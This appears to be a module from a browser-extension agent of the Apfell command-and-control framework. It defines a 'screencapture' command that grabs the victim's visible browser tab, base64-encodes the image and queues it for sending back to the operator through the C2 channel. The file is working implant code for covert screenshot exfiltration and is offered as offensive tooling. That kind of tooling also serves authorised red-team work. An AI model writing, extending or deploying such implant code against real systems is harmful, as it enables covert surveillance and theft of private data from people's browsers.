screencapture = function(params){
    chrome.tabs.captureVisibleTab(null, function(img) {
        let taskid = params['taskid'];
        let tasktype = params['tasktype'];
        if (img === undefined) {
            C2.sendError(taskid, tasktype);
        } else {
            let encImg = img.toString().split(',')[1];
            const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, encImg.length, taskid, tasktype, encImg);
            let meta = {};
            meta["metatype"] = 3;
            meta["metadata"] = apfellmsg;
            const metaenvelope = JSON.stringify(meta);
            out.push(metaenvelope);
        }

    });
};

C2.commands[screencapture.name] = screencapture;
COMMAND_ENDS_HERE
